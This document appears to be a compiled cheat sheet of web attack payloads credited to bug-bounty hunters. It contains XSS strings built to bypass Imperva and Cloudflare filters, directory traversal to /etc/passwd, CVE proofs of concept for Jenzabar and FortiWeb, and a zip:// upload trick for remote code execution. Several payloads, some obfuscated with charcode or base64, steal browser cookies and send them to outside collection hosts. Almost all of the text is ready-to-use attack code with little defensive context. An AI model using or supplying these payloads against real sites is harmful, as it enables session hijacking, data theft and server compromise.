# Imperva WAF bypass payload by @0xInfection

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click


# Ondblclick xss Payloads by alert(Y000!) https://twitter.com/_Y000_


<h1 ondblclick=alert`_Y000!_`>_Y000!_</h1>

<marquee ondblclick=alert`_Y000!_`>_Y000!_</marquee>

<xss ondblclick="alert`_Y000!_`" autofocus tabindex=1>_Y000!_</xss>

<w="/x="y>"/ondblclick=`<`[confir\u006d`_Y000!_`]>z

# Alert Obfuscation by alert(Y000!) https://twitter.com/_Y000_

t\u006fp[/al/.sourc\u0065+/ert/.sourc\u0065]``

Top=t\u006fp
source=sourc\u0065

# Xss payload by alert(Y000!) https://twitter.com/_Y000_

%3Cscript%3Efor((Y000)in(self))eval(Y000)(`${`_Y000!_`}`)%3C/script%3E

# A solid XSS payload that bypasses Imperva WAF by @0xInfection

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

# A cuneiform payload by @lutfumertceylan , blocked by CSP but shows the idea...
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()

# HTML injection by @renniepack:
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;

# HTML injection to #XSS tip by @nav1n0x.

Query <h1>TEST</h1>, if HTML isn't filtered in the result, then try adding, <h1 class="xxx" onmouseover=alert(document.domain)>Shop Now</h1>

# Directory traversal bypass Directory traversal with double URL encoding by @ManasH4rsh

/../../etc/passwd   —   Got nothing?

Try this:

%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd


# Bug: XSS through file upload by @ManasH4rsh

Payload: */alert(1)</script><script>/*

# XSS in Jenzabar (CVE-2021-26723)
POC:
/ics?tool=search&query="><script>alert('xss')</script>

# Xss payload by alert(Y000!) https://twitter.com/_Y000_
<script>Object.defineProperties(window, {xss: {value: {x: function() {return document.cookie}}}});alert(xss.x())</script>

# 4 XSS in FortiWeb (CVE-2021-22122), found by Andrey Medov, have been patched. 
/error3?msg=30&data=';alert('xss');//
/omni_success?cmdb_edit_path=");alert('xss');//

# When you find input field which allows " (quotes), try this payload:
"autofocus onfocus=alert(1)// -> Doesn't work
"type%3d"text"autofocus%20onfocus%3d"alert(1)" -> Works

# Vue.js Javascript Library Client-Side Template Injection cc @ExWareLabs
 
[PoC]
hxxp://host/?name={{this.constructor.constructor('alert("foo")')()}}

# CloudFlare XSS Bypass by JacksonHHax

<svg onload=alert%26%230000000040"1")>

# xss filter and got this interesting payload 

%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>

# xss :  @hunter0x7

img{background-image:url('javascript:alert()')}

# HTML injection or a triager claims you cant execute Open-Redirect inside a web-page without javascript, Use this payload by naglinagli

><meta http-equiv="Refresh" content="0; url='https://naglinagli.github.io'" />

# xss usando location.assign  by alert(Y000!) https://twitter.com/_Y000_

<svg onload=location.assign("javascript:alert`_Y000!_`");>


# XSS redteam, dirty security! Raised fist by spyerror

?age=25;location=/javascript:alert%25281%2529/.source; :>

#  xss Cookie steal
<script>document.write('<img src="https://httpreq.com/odd-leaf-yde1fu7p/record?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');</script>

# xss
<keygen autofocus onfocus=alert(1)>

# xss cookie steal encode with charcode 
<keygen autofocus onfocus=(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39,41))>

<script>location=atob("aHR0cDovLzE5Mi4xNjguMS4zL3oucGhwP3k9").concat(document.cookie)</script>

<keygen autofocus onfocus=document.write(String.fromCharCode(39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39)+document.cookie+String.fromCharCode(39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39))/>

<keygen autofocus onfocus=document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61)+document.cookie(String.fromCharCode(119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62)))/>

<keygen autofocus onfocus=a=document;a.write(
    String.fromCharCode(60,105,109,103,32,115,114,99,61,39,
    104,116,116,112,115,58,47,47,98,99,53,57,98,97,56,49,98,
    48,52,100,49,97,57,97,57,100,53,101,99,51,49,49,98,49,56,
    56,97,49,55,55,46,109,46,112,105,112,101,100,114,101,97,
    109,46,110,101,116,63,116,101,115,116,61).concat(a.cookie)
    .concat(String.fromCharCode(39,47,62))) />
     )/>

<keygen autofocus onfocus=<script>location=atob("aHR0cHM6Ly9odHRwcmVxLmNvbS9vZGQtbGVhZi15ZGUxZnU3cC9yZWNvcmQ/Y21kPQ==").concat(document.cookie)</script> />

<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>

<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>

<keygen autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249Jy8vc2VuZC5oZXJlLm1lPycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;))>

title=cyberpunker&message=<button autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249J2h0dHBzOi8vaHR0cHJlcS5jb20vb2RkLWxlYWYteWRlMWZ1N3AvcmVjb3JkP2NtZD0nK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==&quot;))>

# Bug Bounty Hunting Tip by Shivam Tahalani

If you can upload .zip file on target then:

1. Create a .php file (rce.php)

2. Compress it to a .zip file (file.zip)

3. Upload your .zip file on the vulnerable web application.

4. Trigger your RCE via:

( https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php )



